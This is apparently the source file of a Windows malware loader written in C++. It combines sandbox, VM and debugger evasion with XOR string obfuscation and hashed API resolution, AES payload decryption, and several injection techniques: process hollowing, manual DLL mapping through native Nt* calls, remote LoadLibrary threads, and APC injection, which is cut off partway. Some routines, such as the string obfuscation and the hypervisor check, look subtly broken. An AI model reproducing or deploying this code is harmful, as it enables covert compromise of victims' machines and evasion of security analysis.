#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <wincrypt.h>
#include <psapi.h>
#include <winternl.h>
#include <random>
#include <algorithm>
#include <memory>
#include <intrin.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

// ------------------------ CONSTANTS ------------------------ //
constexpr DWORD MAX_SANDBOX_UPTIME = 5 * 60 * 1000; // 5 minutes
constexpr DWORD MIN_CPU_CORES = 2;
constexpr DWORD MIN_RAM_GB = 2;
constexpr DWORD MIN_DISK_GB = 20;

// ------------------------ STRUCTURES ------------------------ //
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID      Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID      Reserved2[2];
    PVOID      DllBase;
    PVOID      EntryPoint;
    PVOID      Reserved3;
    UNICODE_STRING FullDllName;
    BYTE       Reserved4[8];
    PVOID      Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PPEB_LDR_DATA                 Ldr;
} PEB, *PPEB;

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter,
    ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection, PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* NtQueueApcThread_t)(
    HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext1,
    PVOID ApcContext2, PVOID ApcContext3);

// ------------------------ UTILITIES ------------------------ //
namespace utils {
    void random_sleep(DWORD min_ms, DWORD max_ms) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(min_ms, max_ms);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    std::string get_last_error_string() {
        DWORD error = GetLastError();
        if (error == 0) return "N/A";
        
        LPSTR buffer = nullptr;
        size_t size = FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPSTR)&buffer, 0, NULL);
        
        std::string message(buffer, size);
        LocalFree(buffer);
        return message;
    }

    bool is_elevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;

        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        bool isAdmin = GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize);
        CloseHandle(hToken);
        return isAdmin && elevation.TokenIsElevated;
    }

    bool set_debug_privilege() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;

        TOKEN_PRIVILEGES tkp;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        bool success = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
        return success && GetLastError() == ERROR_SUCCESS;
    }

    class ObfuscatedString {
    private:
        std::vector<char> data;
        char key;

        void xor_decrypt() {
            for (size_t i = 0; i < data.size(); ++i) {
                data[i] ^= key;
            }
        }

    public:
        ObfuscatedString(const char* str, char k) : key(k) {
            size_t len = strlen(str);
            data.resize(len + 1);
            for (size_t i = 0; i < len; ++i) {
                data[i] = str[i] ^ key;
            }
            data[len] = '\0' ^ key;
        }

        const char* get() {
            xor_decrypt();
            xor_decrypt(); // Double XOR returns to original
            return data.data();
        }
    };

    FARPROC get_api_address(HMODULE module, DWORD hash) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)module + dosHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* names = (DWORD*)((BYTE*)module + exportDir->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)module + exportDir->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)module + exportDir->AddressOfFunctions);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            const char* name = (const char*)module + names[i];
            
            DWORD currentHash = 0;
            while (*name) {
                currentHash = ((currentHash << 5) + currentHash) + *name++;
            }

            if (currentHash == hash) {
                return (FARPROC)((BYTE*)module + functions[ordinals[i]]);
            }
        }
        return nullptr;
    }

    bool is_debugger_present() {
        BOOL isDebuggerPresent = FALSE;
        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent) && isDebuggerPresent)
            return true;

        if (IsDebuggerPresent())
            return true;

        __try {
            __debugbreak();
            return true;
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    bool check_hardware() {
        unsigned int hypervisorBit;
        __cpuid((int*)&hypervisorBit, 1);
        if (hypervisorBit & (1 << 31))
            return true;

        unsigned int cpuInfo[4] = { 0 };
        __cpuid((int*)cpuInfo, 1);
        if ((cpuInfo[2] >> 31) & 1)
            return true;

        return false;
    }
}

// ------------------------ CRYPTO ------------------------ //
namespace crypto {
    void xor_crypt(std::vector<BYTE>& data, const std::string& key) {
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= key[i % key.size()];
        }
    }

    bool aes_decrypt(const std::vector<BYTE>& encrypted, std::vector<BYTE>& decrypted, const std::string& password) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HCRYPTKEY hKey = 0;
        BOOL success = FALSE;

        if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            std::cerr << "[!] CryptAcquireContext failed: " << utils::get_last_error_string() << std::endl;
            goto cleanup;
        }

        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            std::cerr << "[!] CryptCreateHash failed: " << utils::get_last_error_string() << std::endl;
            goto cleanup;
        }

        if (!CryptHashData(hHash, (BYTE*)password.c_str(), (DWORD)password.length(), 0)) {
            std::cerr << "[!] CryptHashData failed: " << utils::get_last_error_string() << std::endl;
            goto cleanup;
        }

        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {
            std::cerr << "[!] CryptDeriveKey failed: " << utils::get_last_error_string() << std::endl;
            goto cleanup;
        }

        decrypted = encrypted;
        DWORD dataLen = (DWORD)decrypted.size();
        if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted.data(), &dataLen)) {
            std::cerr << "[!] CryptDecrypt failed: " << utils::get_last_error_string() << std::endl;
            goto cleanup;
        }
        decrypted.resize(dataLen);

        success = TRUE;

    cleanup:
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
        return success;
    }
}

// ------------------------ SANDBOX DETECTION ------------------------ //
namespace sandbox {
    bool check_uptime() {
        DWORD uptime = GetTickCount();
        if (uptime < MAX_SANDBOX_UPTIME) {
            std::cout << "[!] Sandbox detected: Short uptime (" << uptime / 1000 << " seconds)\n";
            return true;
        }
        return false;
    }

    bool check_mouse_activity() {
        POINT p1, p2;
        GetCursorPos(&p1);
        utils::random_sleep(100, 300);
        GetCursorPos(&p2);
        
        if (p1.x == p2.x && p1.y == p2.y) {
            std::cout << "[!] Sandbox detected: No mouse movement\n";
            return true;
        }
        return false;
    }

    bool check_system_resources() {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        if (si.dwNumberOfProcessors < MIN_CPU_CORES) {
            std::cout << "[!] Sandbox detected: Only " << si.dwNumberOfProcessors << " CPU cores\n";
            return true;
        }

        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        DWORDLONG totalRAM = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
        if (totalRAM < MIN_RAM_GB) {
            std::cout << "[!] Sandbox detected: Only " << totalRAM << "GB RAM\n";
            return true;
        }

        ULARGE_INTEGER freeBytes;
        GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freeBytes);
        DWORDLONG totalDisk = freeBytes.QuadPart / (1024 * 1024 * 1024);
        if (totalDisk < MIN_DISK_GB) {
            std::cout << "[!] Sandbox detected: Only " << totalDisk << "GB disk space\n";
            return true;
        }

        return false;
    }

    bool check_process_list() {
        const char* sandboxProcesses[] = {
            "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
            "vboxservice.exe", "vboxtray.exe", "qemu-ga.exe",
            "wireshark.exe", "procmon.exe", "fiddler.exe",
            "xenservice.exe", "vgauthservice.exe", "joeboxserver.exe"
        };

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE)
            return false;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        bool found = false;
        if (Process32First(hSnapshot, &pe)) {
            do {
                for (const char* proc : sandboxProcesses) {
                    if (_stricmp(pe.szExeFile, proc) == 0) {
                        std::cout << "[!] Sandbox detected: Known sandbox process (" << proc << ")\n";
                        found = true;
                        break;
                    }
                }
                if (found) break;
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        return found;
    }

    bool is_sandbox() {
        utils::random_sleep(500, 1500);
        
        if (check_uptime()) return true;
        if (check_mouse_activity()) return true;
        if (check_system_resources()) return true;
        if (check_process_list()) return true;
        if (utils::is_debugger_present()) return true;
        if (utils::check_hardware()) return true;
        
        return false;
    }
}

// ------------------------ PROCESS UTILITIES ------------------------ //
namespace process {
    DWORD find_pid(const std::string& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] CreateToolhelp32Snapshot failed: " << utils::get_last_error_string() << std::endl;
            return 0;
        }

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        DWORD pid = 0;
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, processName.c_str()) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }

        CloseHandle(hSnapshot);
        return pid;
    }

    bool is_process_running(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess)
            return false;

        DWORD exitCode;
        bool running = GetExitCodeProcess(hProcess, &exitCode) && exitCode == STILL_ACTIVE;
        CloseHandle(hProcess);
        return running;
    }

    bool hollow_process(const std::string& targetPath, const std::string& payloadPath) {
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION pi = { 0 };

        if (!CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            std::cerr << "[!] CreateProcess failed: " << utils::get_last_error_string() << std::endl;
            return false;
        }

        HANDLE hFile = CreateFileA(payloadPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] Failed to open payload: " << utils::get_last_error_string() << std::endl;
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        DWORD payloadSize = GetFileSize(hFile, NULL);
        std::vector<BYTE> payloadData(payloadSize);
        DWORD bytesRead;
        if (!ReadFile(hFile, payloadData.data(), payloadSize, &bytesRead, NULL)) {
            std::cerr << "[!] Failed to read payload: " << utils::get_last_error_string() << std::endl;
            CloseHandle(hFile);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadData.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadData.data() + dosHeader->e_lfanew);

        LPVOID imageBase = VirtualAllocEx(pi.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase,
            ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!imageBase) {
            std::cerr << "[!] VirtualAllocEx failed: " << utils::get_last_error_string() << std::endl;
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        if (!WriteProcessMemory(pi.hProcess, imageBase, payloadData.data(),
            ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            std::cerr << "[!] Failed to write headers: " << utils::get_last_error_string() << std::endl;
            VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionAddress = (BYTE*)imageBase + sectionHeader[i].VirtualAddress;
            if (!WriteProcessMemory(pi.hProcess, sectionAddress,
                payloadData.data() + sectionHeader[i].PointerToRawData,
                sectionHeader[i].SizeOfRawData, NULL)) {
                std::cerr << "[!] Failed to write section: " << utils::get_last_error_string() << std::endl;
                VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }

        LPCONTEXT ctx = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
        ctx->ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, ctx)) {
            std::cerr << "[!] GetThreadContext failed: " << utils::get_last_error_string() << std::endl;
            VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ctx->Ebx + 8), &imageBase, sizeof(LPVOID), NULL)) {
            std::cerr << "[!] Failed to update PEB: " << utils::get_last_error_string() << std::endl;
            VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        ctx->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        if (!SetThreadContext(pi.hThread, ctx)) {
            std::cerr << "[!] SetThreadContext failed: " << utils::get_last_error_string() << std::endl;
            VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            std::cerr << "[!] ResumeThread failed: " << utils::get_last_error_string() << std::endl;
            VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
}

// ------------------------ MANUAL MAPPING ------------------------ //
namespace manual_map {
    struct PE_HEADERS {
        PIMAGE_DOS_HEADER dosHeader;
        PIMAGE_NT_HEADERS ntHeaders;
        PIMAGE_SECTION_HEADER sectionHeader;
    };

    PE_HEADERS get_pe_headers(BYTE* dllData) {
        PE_HEADERS headers{};
        headers.dosHeader = (PIMAGE_DOS_HEADER)dllData;
        headers.ntHeaders = (PIMAGE_NT_HEADERS)(dllData + headers.dosHeader->e_lfanew);
        headers.sectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)headers.ntHeaders + sizeof(IMAGE_NT_HEADERS));
        return headers;
    }

    bool map_dll_sections(HANDLE hProcess, BYTE* dllData, BYTE* remoteBase) {
        auto headers = get_pe_headers(dllData);

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

        SIZE_T size = headers.ntHeaders->OptionalHeader.SizeOfHeaders;
        NTSTATUS status = NtAllocateVirtualMemory(hProcess, (PVOID*)&remoteBase, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtAllocateVirtualMemory failed: 0x" << std::hex << status << std::endl;
            return false;
        }

        SIZE_T bytesWritten;
        status = NtWriteVirtualMemory(hProcess, remoteBase, dllData, headers.ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtWriteVirtualMemory failed: 0x" << std::hex << status << std::endl;
            return false;
        }

        for (DWORD i = 0; i < headers.ntHeaders->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER section = &headers.sectionHeader[i];
            LPVOID remoteSection = remoteBase + section->VirtualAddress;
            
            status = NtWriteVirtualMemory(hProcess, remoteSection, dllData + section->PointerToRawData, section->SizeOfRawData, &bytesWritten);
            if (!NT_SUCCESS(status)) {
                std::cerr << "[!] Failed to write section " << section->Name << ": 0x" << std::hex << status << std::endl;
                return false;
            }

            DWORD protect = 0;
            DWORD sectionCharacteristics = section->Characteristics;
            
            if (sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE) {
                protect = (sectionCharacteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
            } else if (sectionCharacteristics & IMAGE_SCN_MEM_READ) {
                protect = (sectionCharacteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
            } else {
                protect = PAGE_NOACCESS;
            }

            SIZE_T sectionSize = section->Misc.VirtualSize;
            ULONG oldProtect;
            status = NtProtectVirtualMemory(hProcess, &remoteSection, &sectionSize, protect, &oldProtect);
            if (!NT_SUCCESS(status)) {
                std::cerr << "[!] Failed to protect section " << section->Name << ": 0x" << std::hex << status << std::endl;
                return false;
            }
        }

        return true;
    }

    bool fix_imports(HANDLE hProcess, BYTE* dllData, BYTE* remoteBase) {
        auto headers = get_pe_headers(dllData);
        IMAGE_DATA_DIRECTORY importDir = headers.ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        
        if (importDir.Size == 0)
            return true;

        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dllData + importDir.VirtualAddress);
        
        while (importDescriptor->Name != 0) {
            char* dllName = (char*)(dllData + importDescriptor->Name);
            HMODULE hModule = GetModuleHandleA(dllName);
            
            if (!hModule) {
                hModule = LoadLibraryA(dllName);
                if (!hModule) {
                    std::cerr << "[!] Failed to load dependency: " << dllName << std::endl;
                    return false;
                }
            }

            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)(dllData + importDescriptor->OriginalFirstThunk);
            PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(remoteBase + importDescriptor->FirstThunk);

            while (originalThunk->u1.AddressOfData != 0) {
                if (originalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    FARPROC function = GetProcAddress(hModule, (LPCSTR)(originalThunk->u1.Ordinal & 0xFFFF));
                    if (!function) {
                        std::cerr << "[!] Failed to get function by ordinal: " << (originalThunk->u1.Ordinal & 0xFFFF) << std::endl;
                        return false;
                    }
                    firstThunk->u1.Function = (DWORD_PTR)function;
                } else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(dllData + originalThunk->u1.AddressOfData);
                    FARPROC function = GetProcAddress(hModule, (LPCSTR)importByName->Name);
                    if (!function) {
                        std::cerr << "[!] Failed to get function: " << importByName->Name << std::endl;
                        return false;
                    }
                    firstThunk->u1.Function = (DWORD_PTR)function;
                }
                
                originalThunk++;
                firstThunk++;
            }
            
            importDescriptor++;
        }

        return true;
    }

    bool call_tls_callbacks(HANDLE hProcess, BYTE* dllData, BYTE* remoteBase) {
        auto headers = get_pe_headers(dllData);
        IMAGE_DATA_DIRECTORY tlsDir = headers.ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        
        if (tlsDir.Size == 0)
            return true;

        PIMAGE_TLS_DIRECTORY tlsDirectory = (PIMAGE_TLS_DIRECTORY)(remoteBase + tlsDir.VirtualAddress);
        PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tlsDirectory->AddressOfCallBacks;
        
        if (!callback)
            return true;

        while (*callback) {
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)*callback, NULL, 0, NULL);
            if (!hThread) {
                std::cerr << "[!] Failed to create thread for TLS callback: " << utils::get_last_error_string() << std::endl;
                return false;
            }
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            callback++;
        }

        return true;
    }

    bool manual_map(HANDLE hProcess, const std::vector<BYTE>& dllData) {
        auto headers = get_pe_headers((BYTE*)dllData.data());
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
        NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

        LPVOID remoteBase = nullptr;
        SIZE_T size = headers.ntHeaders->OptionalHeader.SizeOfImage;
        NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtAllocateVirtualMemory failed: 0x" << std::hex << status << std::endl;
            return false;
        }

        if (!map_dll_sections(hProcess, (BYTE*)dllData.data(), (BYTE*)remoteBase)) {
            NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        if (!fix_imports(hProcess, (BYTE*)dllData.data(), (BYTE*)remoteBase)) {
            NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        if (!call_tls_callbacks(hProcess, (BYTE*)dllData.data(), (BYTE*)remoteBase)) {
            NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        DWORD entryPoint = headers.ntHeaders->OptionalHeader.AddressOfEntryPoint;
        LPVOID remoteEntry = (BYTE*)remoteBase + entryPoint;

        NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        ULONG oldProtect;
        status = NtProtectVirtualMemory(hProcess, &remoteBase, &size, PAGE_EXECUTE_READ, &oldProtect);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtProtectVirtualMemory failed: 0x" << std::hex << status << std::endl;
            NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        HANDLE hThread = NULL;
        status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
            (LPTHREAD_START_ROUTINE)remoteEntry, NULL, FALSE, 0, 0, 0, NULL);
        
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtCreateThreadEx failed: 0x" << std::hex << status << std::endl;
            NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return true;
    }
}

// ------------------------ INJECTION METHODS ------------------------ //
namespace injection {
    bool inject_via_loadlibrary(HANDLE hProcess, const std::string& dllPath) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");

        LPVOID alloc = nullptr;
        SIZE_T size = dllPath.size() + 1;
        NTSTATUS status = NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtAllocateVirtualMemory failed: 0x" << std::hex << status << std::endl;
            return false;
        }

        SIZE_T bytesWritten;
        status = NtWriteVirtualMemory(hProcess, alloc, dllPath.c_str(), dllPath.size() + 1, &bytesWritten);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtWriteVirtualMemory failed: 0x" << std::hex << status << std::endl;
            NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

        HANDLE hThread = NULL;
        status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
            (LPTHREAD_START_ROUTINE)pLoadLibraryA, alloc, FALSE, 0, 0, 0, NULL);
        
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtCreateThreadEx failed: 0x" << std::hex << status << std::endl;
            NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);

        DWORD exitCode;
        GetExitCodeThread(hThread, &exitCode);
        std::cout << "[*] Thread exited with code: " << exitCode << std::endl;

        CloseHandle(hThread);
        NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
        return exitCode != 0;
    }

    bool inject_via_manual_map(HANDLE hProcess, const std::vector<BYTE>& dllData) {
        return manual_map::manual_map(hProcess, dllData);
    }

    bool inject_via_apc(DWORD pid, const std::string& dllPath) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] CreateToolhelp32Snapshot failed: " << utils::get_last_error_string() << std::endl;
            return false;
        }

        THREADENTRY32 te;
        te.dwSize = sizeof(THREADENTRY32);
        DWORD targetThreadId = 0;

        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    targetThreadId = te.th32ThreadID;
                    break;
                }
            } while (Thread32Next(hSnapshot, &te));
        }
        CloseHandle(hSnapshot);

        if (!targetThreadId) {
            std::cerr << "[!] No threads found in target process\n";
            return false;
        }

        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
        if (!hThread) {
            std::cerr << "[!] OpenThread failed: " << utils::get_last_error_string() << std::endl;
            return false;
        }

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
